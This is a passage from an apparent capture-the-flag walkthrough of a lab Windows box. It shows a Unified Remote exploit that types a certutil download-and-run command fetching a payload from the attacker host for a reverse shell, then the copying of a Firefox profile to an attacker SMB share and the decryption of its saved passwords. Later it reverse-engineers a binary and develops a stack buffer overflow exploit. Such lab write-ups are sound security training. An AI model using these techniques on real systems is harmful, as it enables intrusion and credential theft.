    target.sendto(open,(rhost,port))     # Initialize Connection to Unified
    sleep(0.02)
    target.sendto(open_fin,(rhost,port))     # Finish Initializing Connection
    print("[+] Popping Start Menu")
    sleep(0.02)
    SendWin()
    sleep(0.3)
    print("[+] Opening CMD")
    SendString("cmd.exe", rhost)
    sleep(0.3)
    SendReturn()
    sleep(0.3)
    print("[+] *Super Fast Hacker Typing*")
    SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " " + staging_dir + payload, rhost) # Retrieve HTTP hosted payload
    sleep(0.3)
    print("[+] Downloading Payload")
    SendReturn()
    sleep(3)
    SendString(staging_dir + payload, rhost) # Execute Payload
    sleep(0.3)
    SendReturn()
    print("[+] Done! Check listener?")
    target.close()

```

When I run this, it works:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115 57582
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Users\clara>

```

I’ll run `powershell` to switch shells, and grab `user.txt`:

```

PS C:\Users\clara\Desktop> cat user.txt
b0a89347************************

```

## Shell as development

### Enumeration

#### Users

The box has 3 non-administrator users with home directories:

```

PS C:\users> dir

    Directory: C:\users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/30/2021   9:54 AM                Administrator
d-----        11/30/2021   9:54 AM                clara
d-----         6/26/2021  10:35 PM                development
d-r---          6/3/2021   7:00 AM                Public
d-----        11/30/2021   9:54 AM                svc_account

```

I’ve already compromised svc\_account and clara. I noted the `C:\DevApp` folder, which clara also can’t access. It seems reasonable to think that development might be able to.

#### Firefox

Looking around in clara’s home directory, there are two Firefox profiles:

```

PS C:\Users\clara\appdata\roaming\mozilla\firefox\profiles> ls

    Directory: C:\Users\clara\appdata\roaming\mozilla\firefox\profiles

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/26/2021  10:32 PM                ljftf853.default-release
d-----         6/26/2021  10:17 PM                ukz4dxct.default 

```

One is basically empty:

```

PS C:\Users\clara\appdata\roaming\mozilla\firefox\profiles\ukz4dxct.default> ls

    Directory: C:\Users\clara\appdata\roaming\mozilla\firefox\profiles\ukz4dxct.default

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/26/2021  10:17 PM             47 times.json

PS C:\Users\clara\appdata\roaming\mozilla\firefox\profiles\ukz4dxct.default> type times.json
type times.json
{
"created": 1624771026836,
"firstUse": null
}

```

The other has a lot in it:

```

PS C:\Users\clara\appdata\roaming\mozilla\firefox\profiles\ljftf853.default-release> ls

    Directory: C:\Users\clara\appdata\roaming\mozilla\firefox\profiles\ljftf853.default-release

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/26/2021  10:17 PM                bookmarkbackups
d-----         6/26/2021  10:18 PM                crashes
d-----         6/26/2021  10:32 PM                datareporting
d-----         6/26/2021  10:29 PM                features
d-----         6/26/2021  10:22 PM                gmp-gmpopenh264
d-----         6/26/2021  10:22 PM                gmp-widevinecdm
d-----         6/26/2021  10:17 PM                minidumps
d-----         6/26/2021  10:32 PM                saved-telemetry-pings
d-----         6/26/2021  10:22 PM                security_state
d-----         6/26/2021  10:32 PM                sessionstore-backups
d-----         6/26/2021  10:17 PM                storage
-a----         6/26/2021  10:29 PM             24 addons.json
-a----         6/26/2021  10:29 PM           4199 addonStartup.json.lz4
-a----         6/26/2021  10:22 PM            858 AlternateServices.txt
-a----         6/26/2021  10:22 PM            216 broadcast-listeners.json
-a----         6/26/2021  10:22 PM         229376 cert9.db
-a----         6/26/2021  10:32 PM             85 cert_override.txt
-a----         6/26/2021  10:17 PM            199 compatibility.ini
-a----         6/26/2021  10:17 PM            939 containers.json
-a----         6/26/2021  10:17 PM         229376 content-prefs.sqlite
-a----         6/26/2021  10:17 PM          98304 cookies.sqlite
-a----         6/26/2021  10:29 PM           1123 extension-preferences.json
-a----         6/26/2021  10:31 PM          38223 extensions.json
-a----         6/26/2021  10:32 PM        5242880 favicons.sqlite
-a----         6/26/2021  10:17 PM         262144 formhistory.sqlite
-a----         6/26/2021  10:17 PM            683 handlers.json
-a----         6/26/2021  10:20 PM         294912 key4.db
-a----         6/26/2021  10:21 PM            674 logins.json
-a----         6/26/2021  10:17 PM              0 parent.lock
-a----         6/26/2021  10:32 PM          98304 permissions.sqlite
-a----         6/26/2021  10:17 PM            505 pkcs11.txt
-a----         6/26/2021  10:32 PM        5242880 places.sqlite
-a----         6/26/2021  10:32 PM          11512 prefs.js
-a----         6/26/2021  10:17 PM            180 search.json.mozlz4
-a----         6/26/2021  10:32 PM            288 sessionCheckpoints.json
-a----         6/26/2021  10:32 PM           2566 sessionstore.jsonlz4
-a----         6/26/2021  10:17 PM             18 shield-preference-experiments.json
-a----         6/26/2021  10:32 PM            730 SiteSecurityServiceState.txt
-a----         6/26/2021  10:32 PM           4096 storage.sqlite
-a----         6/26/2021  10:17 PM             50 times.json
-a----         6/26/2021  10:32 PM          98304 webappsstore.sqlite
-a----         6/26/2021  10:32 PM            220 xulstore.json   

```

#### Exfil

To really look through this profile, I’ll want to copy all of files back to my VM. I’ll start a SMB server with Python:

```

oxdf@hacky$ smbserver.py s . -username oxdf -password oxdf -smb2support
Impacket v0.9.25.dev1+20220119.101925.12de27dc - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

For modern versions of Windows, I won’t be able to connect without a username and password, and I’ll need SMBv2 support.

I’ll connect to the share from Hancliffe:

```

PS C:\> net use \\10.10.14.6\s /u:oxdf oxdf                
The command completed successfully.

```

Now I can access `\\10.10.14.6\s` from Hancliffe.

I’ll copy the entire profile back to my computer:

```

PS C:\Users\clara\appdata\roaming\mozilla\firefox\profiles> copy -recurse ljftf853.default-release \\10.10.14.6\s\

```

### Decrypt Passwords

#### Manual Exploring

[This post](https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/) does a really nice job walking through how Firefox (and Chrome) passwords can be decrypted. [This Diagram](https://raw.githubusercontent.com/lclevy/firepwd/master/mozilla_pbe.pdf) is also really useful:

[![](https://0xdfimages.gitlab.io/img/mozilla_pbe-1.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/mozilla_pbe-1.png)

Firefox stores saved passwords in a file named `logon.json`. Looking at the file from clara, there’s one entry, for localhost port 8000 (the H@$hPa$$ instance):

```

{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "http://localhost:8000",
      "httpRealm": null,
      "formSubmitURL": "http://localhost:8000",
      "usernameField": "website",
      "passwordField": "masterpassword",
      "encryptedUsername": "MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECP+7GREfh/OCBBACN8BqXSHhgvedk/ffsRBn",
      "encryptedPassword": "MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEQe5quezh5lBCg7VV7cXOky4tBMinRRncbXJl1YC3P0Ql5J8ZZS6ZnVjg9yXrbOq1Me",
      "guid": "{39d1884b-56cd-4e30-869b-e0d9df6ca9d9}",
      "encType": 1,
      "timeCreated": 1624771259387,
      "timeLastUsed": 1624771259387,
      "timePasswordChanged": 1624771259387,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}

```

The password field is “masterpassword”, which means if I can recover it, I can generate passwords for some user for any site I want. The username and password are encrypted.

The keys are stored in `key4.db`, a SQLite database:

```

oxdf@hacky$ file key4.db 
key4.db: SQLite 3.x database, last written using SQLite version 3035004

```

The DB has two tables:

```

oxdf@hacky$ sqlite3 key4.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
metaData    nssPrivate

```

The tables aren’t helpfully set up:

```

sqlite> .schema metaData 
CREATE TABLE metaData (id PRIMARY KEY UNIQUE ON CONFLICT REPLACE, item1, item2);
sqlite> .schema nssPrivate
CREATE TABLE nssPrivate (id PRIMARY KEY UNIQUE ON CONFLICT ABORT, a0, a1, a2, a3, a10, a11, a12, a80, a81, a82, a83, a84, a85, a86, a87, a88, a89, a8a, a8b, a90, a100, a101, a102, a103, a104, a105, a106, a107, a108, a109, a10a, a10b, a10c, a110, a111, a120, a121, a122, a123, a124, a125, a126, a127, a128, a129, a130, a131, a132, a133, a134, a160, a161, a162, a163, a164, a165, a166, a170, a180, a181, a200, a201, a202, a210, a300, a301, a302, a400, a401, a402, a403, a404, a405, a406, a480, a481, a482, a500, a501, a502, a503, a40000211, a40000212, a80000001, ace534351, ace534352, ace534353, ace534354, ace534355, ace534356, ace534357, ace534358, ace534364, ace534365, ace534366, ace534367, ace534368, ace534369, ace534373, ace534374, ace536351, ace536352, ace536353, ace536354, ace536355, ace536356, ace536357, ace536358, ace536359, ace53635a, ace53635b, ace53635c, ace53635d, ace53635e, ace53635f, ace536360, ace5363b4, ace5363b5, ad5a0db00);
CREATE INDEX issuer ON nssPrivate (a81);
CREATE INDEX subject ON nssPrivate (a101);
CREATE INDEX label ON nssPrivate (a3);
CREATE INDEX ckaid ON nssPrivate (a102);

```

It is quite complicated to move from the data in this DB to the decryption keys (see the post above for detail), but the salts, ivs, and keys are pulled from the DB, combined with a user supplied password (if used), and used to decrypt the username and password.

#### Firepwd

Luckily for me, [Firepwd.py](https://github.com/lclevy/firepwd) is a tool that recovers passwords from `key4.db` or `logins.json` files (it turns out I only needed those two files).

Running it against the profile directory returns the decrypted username and password on the last line:

```

oxdf@hacky$ python /opt/firepwd/firepwd.py -d ljftf853.default-release/
globalSalt: b'9a30912b4d63331f8493789d7b0fce68520f9265'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'cda4b75c5041c6cc7114e053f012122ce92ada163d91df9306158a06d145998a'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'f8cea67900ed4b333ca56416f69a'
       }
     }
   }
   OCTETSTRING b'3f321c52f6534075d3d8915531d27df9'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'8d0ed50896869dc856de82150164a1390a953b67792edac2a62315625836ff08'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'76eba390fe01807925d822a071da'
       }
     }
   }
   OCTETSTRING b'cde74fae29c28c791794371b447180cabce01b6927bac73199f192e557136c36'
 }
clearText b'9efbbfd986fd5bef94b032679b7679d09b1f51891601b6e50808080808080808'
decrypting login/password pairs
http://localhost:8000:b'hancliffe.htb',b'#@H@ncLiff3D3velopm3ntM@st3rK3y*!'

```

Based on the password, it seems that it’s for the development account.

#### WinPeas

Props to [IppSec](https://www.youtube.com/watch?v=kA-bkftyyY0) for pointing out to me that [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will actually decrypt these passwords automatically.

I’ll grab the [latest release](https://github.com/carlospolop/PEASS-ng/releases/tag/20220303) and upload it:

```

PS C:\ProgramData> wget http://10.10.14.6/winPEASx64.exe -outfile wp.exe -usebasicparsing

```

Now I’ll run it:

```

PS C:\ProgramData> .\wp.exe
             *((,.,/((((((((((((((((((((/,  */               
      ,/*,..*((((((((((((((((((((((((((((((((((,           
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*       
    ((((((((((((((((**********/########## .(* ,(((((((   
    (((((((((((/********************/####### .(. (((((((
    ((((((..******************/@@@@@/***/###### ./(((((((
    ,,....********************@@@@@@@@@@(***,#### .//((((((
    , ,..********************/@@@@@%@@@@/********##((/ /((((
...[snip]...

```

There’s a ton of output, but in there:

```

...[snip]...
=================================================================================================

 Browsers Information

͹ Showing saved credentials for Firefox
     Url:           http://localhost:8000
     Username:      hancliffe.htb
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!

=================================================================================================
...[snip]...

```

### H@$hPa$$

#### Generate Password

There is a user named development on Hancliffe:

```

PS C:\> net user development
net user development
User name                    development
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/26/2021 9:35:26 PM
Password expires             Never
Password changeable          6/26/2021 9:35:26 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   1/29/2022 5:21:33 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

```

They are even in the Remote Management Users group, which means they can connect over WinRM.

If I guess the username development, and fill in the other two fields from the saved password, it returns a password on clicking “Generate Password”:

![image-20220129082513332](https://0xdfimages.gitlab.io/img/image-20220129082513332.png)

#### Tunnel WinRM

To see if “AMl.q2DHp?2.C/V0kNFU” is the password for the development account, I’ll start a new Chisel tunnel that provides a Socks proxy:

```

PS C:\programdata> .\c client 10.10.14.6:8000 R:socks
.\ch client 10.10.14.6:8000 R:socks
2022/01/29 05:14:12 client: Connecting to ws://10.10.14.6:8000
2022/01/29 05:14:12 client: Connected (Latency 91.3529ms)

```

I’ll confirm the list of proxies at the end of `/etc/proxychains.conf` is correctly pointing to TCP 1080:

```

[ProxyList]
socks5  127.0.0.1 1080

```

Proxychains will allow the `Evil-WinRM` connection:

```

oxdf@hacky$ proxychains evil-winrm -i 127.0.0.1 -u development -p 'AMl.q2DHp?2.C/V0kNFU'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5985  ...  OK
*Evil-WinRM* PS C:\Users\development\Documents>

```

## Shell as root

### Enumeration

I finally have access to `C:\DevApp`:

```
*Evil-WinRM* PS C:\devapp> ls

    Directory: C:\devapp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe
-a----         9/14/2021  10:57 AM            636 restart.ps1

```

I’ll download the binary:

```
*Evil-WinRM* PS C:\devapp> download MyFirstApp.exe
Info: Downloading C:/devapp/MyFirstApp.exe to ./MyFirstApp.exe

Info: Download successful!

```

There’s also this `restart.ps1` script here:

```

# Restart app every 3 mins to avoid crashes
while($true) {
  # Delete existing forwards
  cmd /c "netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0"
  # Spawn app
  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ("C:\DevApp\MyFirstApp.exe")
  sleep 2
  # Get random port
  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort
  # Forward port to 9999
  cmd /c "netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1"
  sleep 180
  # Kill and repeat
  taskkill /f /t /im MyFirstApp.exe
}

```

This is going to start the app (every three minutes according to the comment), and then figure out what port it’s listening on, and forward port 9999 to that port using `netsh`. Effectively, this allows the binary to listen on any port, and it will look like port 9999 to someone off the box. So this is the binary that is listening on port 9999 from the [initial enumeration](#brankas-application---tcp-9999).

### MyFirstApp.exe

#### main / connection\_handler

As always, I’ll start by finding the `main` function, and renaming, retyping, and setting equates to make the code more readable. I’ll walk through that process in [this video](https://youtu.be/r4aaNt7f-lM):

Once doing that, the `main` is pretty simple, picking a random port between 9000-9999 and listening on it, and then accepting connections, and for each spinning off a thread that runs the handling function.

The function I named `connection_handler` creates a 0x400 byte buffer to receive data. Then it prompts for username and password (just like I saw with `nc` at the start of this box), each time reading the response into the receive buffer, and then using `strncpy` to copy into another buffer:

```

    send(sock,"Username: ",10,0);
    recv(sock,recv_buf,0x400,0);
    _strncpy(username,recv_buf,10);
    _memset(recv_buf,0,0x400);
    send(sock,"Password: ",10,0);
    recv(sock,recv_buf,0x400,0);
    _strncpy(password,recv_buf,0x11);

```

These are safe copies because they are limited to the length of the specific buffer.

The username and password are passed into a function called `login`, which returns non-zero if they are “correct”, and the thread is exited:

```

    login_res = _login(username,password)
    if (login_res == 0) {
      send(sock,"Username or Password incorrect\r\n",0x21,0);
      closesocket(sock);
                    /* WARNING: Subroutine does not return */
      ExitThread(0);
    }

```

I’ll come back to `_login`.

Assuming it logs in successfully, it enters a `while (true)` loop, prompting for a full name and an input code. Both of these are read into the receive buffer, and safely copied into new buffers.

The results are passed to `_SaveCreds`, and then checked against the code and the full name:

```

      _SaveCreds(code,fullname);
      iVar1 = _strncmp(code,"T3D83CbJkl1299",0xe);
      if (iVar1 != 0) {
        send(sock,"Wrong Code\r\n",0xd,0);
        closesocket(sock);
                    /* WARNING: Subroutine does not return */
        ExitThread(0);
      }
      iVar1 = _strncmp(fullname,"Vickry Alfiansyah",0x11);
      if (iVar1 == 0) {
        send(sock,"Unlocked\r\n",0xb,0);
        closesocket(sock);
                    /* WARNING: Subroutine does not return */
        ExitThread(0);
      }
    }

```

Correct or not, it doesn’t really do anything.

#### \_SaveCreds

This function also doesn’t do anything at this point:

```

void __cdecl _SaveCreds(char *code,char *fullname)

{
  char code_copy [50];
  char *fullname_copy;
  
  fullname_copy = (char *)_malloc(100);
  _strcpy(fullname_copy,fullname);
  _strcpy(code_copy,code);
  return;
}

```

Still, it does that nothing in a very insecure way. `strcpy` (as opposed to `strncpy` used in other functions) doesn’t limit the length, copying until it reaches a null.

`code` was a 0x50 (= 80) byte long buffer in `connection_handler`, but it’s copying into a 50 byte buffer here. That’s 30 bytes of overflow.

#### \_login

To get to this overflow, I’ll need to successfully login. The function looks like:

```

bool __cdecl _login(char *user_username,void *user_password)

{
  size_t len_enc_twice;
  int match;
  char user_pass_17 [17];
  char *enc_twice_b64;
  byte *enc_twice;
  byte *local_20;
  size_t len_enc_once;
  char *enc_once;
  char *enc_pass;
  char *username;
  
  username = "alfiansyah";
  enc_pass = "YXlYeDtsbD98eDtsWms5SyU=";
  _memmove(user_pass_17,user_password,0x11);
  enc_once = _encrypt1(0,user_pass_17);
  len_enc_once = _strlen(enc_once);
  enc_twice = (byte *)_encrypt2(enc_once,len_enc_once);
  local_20 = enc_twice;
  len_enc_twice = _strlen((char *)enc_twice);
  enc_twice_b64 = (char *)_b64_encode(enc_twice,len_enc_twice);
  match = _strcmp(username,user_username);
  if ((match == 0) && (match = _strcmp(enc_pass,enc_twice_b64), match == 0)) {
    return true;
  }
  return false;
}

```

The username has to match a string, “alfiansyah”. There’s also a string I’ve named `enc_pass`. The user input password is put through `_encrypt1`, then `_encrypt2`, and then `_b64_encode`, and the result is compared to this string. Both need to match.

#### \_encrypt1

`_encrypt1` is pretty simple:

```

char * __cdecl _encrypt1(undefined4 null,char *user_password)

{
  char *string;
  size_t len_string;
  uint i;
  char new_char;
  
  string = _strdup(user_password);
  len_string = _strlen(string);
  for (i = 0; i < len_string; i = i + 1) {
    if ((' ' < string[i]) && (string[i] != '\x7f')) {
      new_char = (char)(string[i] + 0x2f);
      if (string[i] + 0x2f < 0x7f) {
        string[i] = new_char;
      }
      else {
        string[i] = new_char + -0x5e;
      }
    }
  }
  return string;
}

```

It’s looping over each character in the input, and as long as it’s greater than space (0x20) and not 0x7f , it adds 0x2f. The, if it’s less than 0x7f, it stores that character, else it subtracts 0x5e and stores. Effectively, this is like a ROT encryption, except it’s rotating across 0x21 (the “!” character) through 0x7e (“~”). In fact, this algorithm is known as [ROT-47](https://en.wikipedia.org/wiki/ROT13#Variants).

#### \_encrypt2

`_encrypt2` is a bit more complicated, but not much:

```

char * __cdecl _encrypt2(char *string,int string_len)

{
  char *string_;
  byte char;
  int i;
  bool is_cap;
  
  string_ = _strdup(string);
  for (i = 0; i < string_len; i = i + 1) {
    char = string[i];
    if ((char < 0x41) || (((0x5a < char && (char < 0x61)) || (0x7a < char)))) {
      string_[i] = char;
    }
    else {
      is_cap = char < 0x5b;
      if (is_cap) {
        char = char + 0x20;
      }
      string_[i] = 'z' - (char + 0x9f);
      if (is_cap) {
        string_[i] = string_[i] + -0x20;
      }
    }
  }
  return string_;
}

```

If the character isn’t within 0x41 and 0x5a or within 0x61 and 0x7a, the character stays the same. Effectively, it only modifies non ASCII letters.

Next there’s a check if the letter is capitalized, and if so, 0x20 is added making it lowercase.

Then the byte is calculated using `'z' - char - 0x9f`. This isn’t intuitive, so I’ll play with it shortly.

Finally, if 0x20 was added, it’s now subtracted to return to capitalized.

To the subtraction, `'z' - 0x9f` is -37:

```

>>> ord('z') - 0x9f
-37

```

We’re going to subtract `char` from that, making an even more negative number. Since `char` will be within 0x61 and 0x7a, the result will be between -134 and -159:

```

>>> ord('z') - 0x9f - 0x61
-134
>>> ord('z') - 0x9f - 0x7a
-159

```

However, because we’re dealing with bytes, and the smallest number that can be held in a signed byte is -128 and in an unsigned byte is 0. Since these are characters, we’ll think of them as unsigned bytes (roughly the same analysis applies if we choose signed).

One way to handle when a number goes outside it’s valid range (for a single unsigned byte 0-255) is to add or subtract the size of the range until it’s back in the valid range. So in this case, for -134, to get that back into 0-255, I can just add 256. The same works for -159.

The result shows that the output of this function will fall between 0x61 and 0x7a:

```

>>> ord('z') - 0x9f - 0x7a + 256
97
>>> ord('z') - 0x9f - 0x61 + 256
122
>>> hex(ord('z') - 0x9f - 0x7a + 256)
'0x61'
>>> hex(ord('z') - 0x9f - 0x61 + 256)
'0x7a'

```

So the letters start and end in the same range. I can loop over all the ASCII lowercase letters and see what they go in as and come out as:

```

>>> [(c, chr(ord('z') - 0x9f - ord(c) + 256)) for c in string.ascii_lowercase]
[('a', 'z'), ('b', 'y'), ('c', 'x'), ('d', 'w'), ('e', 'v'), ('f', 'u'), ('g', 't'), ('h', 's'), ('i', 'r'), ('j', 'q'), ('k', 'p'), ('l', 'o'), ('m', 'n'), ('n', 'm'), ('o', 'l'), ('p', 'k'), ('q', 'j'), ('r', 'i'), ('s', 'h'), ('t', 'g'), ('u', 'f'), ('v', 'e'), ('w', 'd'), ('x', 'c'), ('y', 'b'), ('z', 'a')]

```

Basically, it’s swapping a –> z, b –> y, and so on. This cipher is known as [Atbash](https://en.wikipedia.org/wiki/Atbash).

#### Creds

With the target string, I’ll decode in the opposite order to get the password, first base64 decoding, then Atbash, and then ROT47 (all in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Atbash_Cipher()ROT47(47)&input=WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9)):

![image-20220203161045123](https://0xdfimages.gitlab.io/img/image-20220203161045123.png)

Neither Atbash and ROT47 have encrypt/decrypt functions, as the same function does both for each.

With these creds, the login works:

```

oxdf@hacky$ nc 10.10.11.115 9999
Welcome Brankas Application.
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: 

```

### Local Exploit

#### Find Offset

The first thing I need is the offset from my input to the return pointer that will overwrite EIP. I’ll start `MyFirstApp.exe` running in my Windows VM with x32dbg attached. I’ll generate a pattern buffer with `pattern_create.rb`:

```

oxdf@hacky$ pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

```

That goes into a simple Python script that will connect, give the correct username/passwords, and send the pattern into the overflow:

```

#!/usr/bin/env python3

from pwn import *

r = remote("10.1.1.163", args['PORT'])

payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

r.recvuntil("Username: ")
r.sendline(b"alfiansyah")
r.recvuntil("Password: ")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil("FullName: ")
r.sendline(b"0xdf")
r.recvuntil("Input Your Code: ")
r.sendline(payload)
r.interactive()

```

pwntools lets you pass in args using all caps words at the end of the command line, and since the port on my local instance will change, I’ll use that here. I can run this as `python3 sploit.py PORT=9094`.

When I run that, it crashes the program in x32dbg, and I’ll note EIP:

![image-20220203170114908](https://0xdfimages.gitlab.io/img/image-20220203170114908.png)

Giving that result to `pattern_offset` shows the return address goes 66 bytes into the overflow:

```

oxdf@hacky$ pattern_offset.rb -q 41326341
[*] Exact match at offset 66

```

I can verify by updating the payload to:

```

payload = b"A" * 66 + b"BBBB"

```

Now it writes Bs in EIP:

![image-20220203171721105](https://0xdfimages.gitlab.io/img/image-20220203171721105.png)

#### DEP

If I can execute from the stack, this exploit becomes much easier. Data execution prevention (DEP, or NX) is a protection that prevents that.

~~I don’t have a good way to check if data execution prevention (DEP) is enabled, but it’s much less common on Windows than it is on Linux, so it’s worth trying to execute from the stack. Microsoft application all run with DEP, but 3rd-party stuff often does not.~~

~~If I try to check from a non-privileged shell, it fails:~~

```

C:\programdata>bcdedit /enum {current}
bcdedit /enum {current}
The specified entry type is invalid.
Run "bcdedit /?" for command line assistance.
The parameter is incorrect.

```

~~Not worth a full Beyond Root section, but it’s actually not possible (at least not easy) to run this from the admin shell I’ll get later, as that shell is 32-bit, and there is no 32-bit version of `bcdedit`.~~
*Update*: There is a way to check the DEP settings as a use using `wmic` (at least until Microsoft moves forward [not including it by default](https://www.bleepingcomputer.com/news/microsoft/microsoft-starts-killing-off-wmic-in-windows-will-thwart-attacks/)):

```

PS C:\> wmic OS Get DataExecutionPrevention_SupportPolicy
DataExecutionPrevention_SupportPolicy  
2 

```

[This page](https://docs.microsoft.com/en-us/troubleshoot/windows-client/performance/determine-hardware-dep-available) shows the command, as well as a table showing the output values:

![image-20220306064328242](https://0xdfimages.gitlab.io/img/image-20220306064328242.png)

So 2 means `OptIn`, which means Windows binaries are using it, and other programs can choose to, but don’t by default. 3 would mean I needed to find another way. I *think* 0 and 1 are legacy options from when Microsoft first tried to introduce DEP in Windows Vista and it broke a ton of things.

To go down this path, I’ll disabled DEP in my test VM by following the instructions [here](https://www.a1logic.com/2012/06/14/disable-dep-and-aslr-on-windows-7-64bit-at-compile-time/) and rebooting.

#### Find Jmp ESP

The easiest way to orient yourself in a Windows executable is to find a `JMP ESP` gadget and use that as the return address. I’ll right click in the CPU window and select “Search for” > “All Modules” > “Command”:

![image-20220203172616918](https://0xdfimages.gitlab.io/img/image-20220203172616918.png)

I’ll give it `JMP ESP`, and it finds several:

![image-20220203172657158](https://0xdfimages.gitlab.io/img/image-20220203172657158.png)

I’ll update my payload to return to one of these addresses:

```

payload = b"A" * 66 + p32(0x7190239f) + b"\xCC"*4

```

I’m using 0xCC as the bytes that will be jumped to as that is the INT instruction (four times), which will will break the debugger there. On running this, the program breaks, this time with EIP pointing at the second of the four 0xCC bytes (having just executed the first causing the break):

![image-20220203215128438](https://0xdfimages.gitlab.io/img/image-20220203215128438.png)

This shows I’ve managed to jump into a buffer where I can have shellcode.

If the program crashes here, it’s likely that DEP is enabled.

#### Length Limits

The next challenge is in how little space I can write after the return overwrite. Up to 0x400 bytes are read from the socket, but then only 0x50 of them are copied into `code` which is what’s passed into the function:

![image-20220203204855465](https://0xdfimages.gitlab.io/img/image-20220203204855465.png)

Given 66 bytes of junk and the return address, that leaves only 10 bytes to work with. I can show this by changing the payload to have 100 Cs:

```

payload = b"A"*66 + p32(0x7190239f) + b"\xCC"*100

```

This time at the crash, EIP is still one byte into the INTs, but there’s only 10 bytes of CC:

![image-20220203215507285](https://0xdfimages.gitlab.io/img/image-20220203215507285.png)

#### Getting a Bit More Space

Looking up the stack a bit, there’s 66 bytes of space I can use that I’ve currently filled with “A”. All I need is less than 10 bytes of shellcode that jumps back. I’ll write a short ASM program with just that instruction:

```

bits 32
jmp $-70

```

Now I’ll compile that and look at the bytes:

```

oxdf@hacky$ nasm -o sc sc.asm; xxd sc
00000000: ebb8 

```

Alternatively, there’s a MSF tool called `metasm_shell.rb` that will allow me to type in asm, and get the bytes back:

```

metasm > jmp $-70
"\xeb\xb8"

```

I’ll update the payload, replacing the INTs with these two bytes to jump back to the start of the buffer. I’ll also replace “A” with INTs so that it breaks when it gets there:

```

payload = b"\xCC"*66 + p32(0x7190239f) + b"\xeb\xb8"

```

